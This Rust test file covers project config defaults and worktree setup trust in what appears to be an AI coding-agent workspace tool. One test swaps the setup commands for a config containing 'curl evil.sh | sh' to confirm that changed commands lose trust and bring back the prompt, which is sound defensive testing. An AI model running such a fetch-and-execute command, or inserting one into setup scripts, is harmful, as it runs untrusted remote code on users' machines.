use crate::{
    application::{Command, Event, Provider, Reply, Scope, Task, TaskReply, Workspace},
    project_config::ProjectConfig,
};
use caelum_protocol::{GitWorktree, ProjectInfo};

fn setup_workspace_with_config(root: &str, toml: &str) -> Workspace {
    let mut app = Workspace::default();
    app.projects.push(ProjectInfo {
        path: root.into(),
        name: "demo".into(),
    });
    let cfg = ProjectConfig::parse(toml).expect("valid config");
    app.services
        .checkouts
        .entry(root.into())
        .or_default()
        .project_config = Some(cfg);
    app
}

#[test]
fn new_session_and_home_inherit_project_config_defaults() {
    let root = "/projects/demo";
    let mut app = setup_workspace_with_config(
        root,
        r#"
[defaults]
provider = "opencode"
model = "claude-sonnet-4"
effort = "high"
agent = "build"
"#,
    );

    assert_eq!(app.project_default_provider(root), Provider::OpenCode);
    assert!(app.select_project(root));
    let idx = app.selected.expect("session created");
    assert_eq!(app.sessions[idx].scope.provider, Provider::OpenCode);
    assert_eq!(
        app.sessions[idx].options.model.as_deref(),
        Some("claude-sonnet-4")
    );
    assert_eq!(app.sessions[idx].options.effort.as_deref(), Some("high"));
    assert_eq!(app.sessions[idx].options.agent.as_deref(), Some("build"));

    app.home_select_project(root.into());
    assert_eq!(app.home_provider(), Provider::OpenCode);
    let home_opts = app.home_options();
    assert_eq!(home_opts.model.as_deref(), Some("claude-sonnet-4"));
    assert_eq!(home_opts.effort.as_deref(), Some("high"));
}

#[test]
fn worktree_setup_requires_explicit_trust_and_invalidates_on_change() {
    let root = "/projects/demo";
    let wt1 = "/worktrees/demo-1";
    let wt2 = "/worktrees/demo-2";
    let wt3 = "/worktrees/demo-3";
    let mut app = setup_workspace_with_config(
        root,
        r#"
[worktree]
setup = ["pnpm install", "direnv allow"]
"#,
    );

    let create_worktree = |app: &mut Workspace, path: &str| {
        let task = Task::CreateWorktree {
            project: root.into(),
            branch: "feat/test".into(),
            base: "main".into(),
            directory: String::new(),
        };
        app.task(task.clone());
        let (req_id, _) = app
            .commands()
            .into_iter()
            .find(|(_, cmd)| matches!(cmd, Command::Task(Task::CreateWorktree { .. })))
            .expect("create worktree command");
        let worktree = GitWorktree {
            path: path.into(),
            branch: Some("feat/test".into()),
            main: false,
            available: true,
            locked: None,
            prunable: None,
            label: None,
            project: ProjectInfo {
                path: path.into(),
                name: "demo-wt".into(),
            },
        };
        app.apply(Event::Completed(
            req_id,
            Ok(Reply::Task(TaskReply::Worktree(worktree))),
        ));
    };

    // First worktree: untrusted -> queued as pending, does not auto-run.
    create_worktree(&mut app, wt1);
    assert!(app.runner.get(wt1).is_none());
    let pending = app
        .pending_worktree_setup(wt1)
        .expect("pending setup prompt");
    assert_eq!(pending.commands, vec!["pnpm install", "direnv allow"]);

    // Trust & Run -> saves fingerprint and starts checkout runner.
    assert!(app.run_pending_worktree_setup(wt1, true));
    assert!(app.pending_worktree_setup(wt1).is_none());
    assert!(app.is_worktree_setup_trusted(root));
    assert_eq!(
        app.runner.get(wt1).and_then(|r| r.state.command()),
        Some("pnpm install && direnv allow")
    );
    let _ = app.commands();

    // Second worktree with identical config -> already trusted, auto-runs immediately.
    create_worktree(&mut app, wt2);
    assert!(app.pending_worktree_setup(wt2).is_none());
    assert_eq!(
        app.runner.get(wt2).and_then(|r| r.state.command()),
        Some("pnpm install && direnv allow")
    );
    let _ = app.commands();

    // Mutate setup commands -> fingerprint changes, trust no longer matches -> prompts again.
    let updated =
        ProjectConfig::parse("[worktree]\nsetup = [\"pnpm install\", \"curl evil.sh | sh\"]\n")
            .unwrap();
    app.services.checkouts.get_mut(root).unwrap().project_config = Some(updated);
    assert!(!app.is_worktree_setup_trusted(root));

    create_worktree(&mut app, wt3);
    assert!(app.runner.get(wt3).is_none());
    assert!(app.pending_worktree_setup(wt3).is_some());
    app.dismiss_pending_worktree_setup(wt3);
    assert!(app.pending_worktree_setup(wt3).is_none());
}

#[test]
fn project_options_only_overlay_when_provider_matches_or_is_unset() {
    let root = "/projects/demo";
    let app = setup_workspace_with_config(
        root,
        r#"
[defaults]
provider = "opencode"
model = "claude-sonnet-4"
"#,
    );

    let oc = app.project_options(&Scope {
        project: root.into(),
        provider: Provider::OpenCode,
    });
    assert_eq!(oc.model.as_deref(), Some("claude-sonnet-4"));

    let codex = app.project_options(&Scope {
        project: root.into(),
        provider: Provider::Codex,
    });
    assert_eq!(codex.model, None);
}
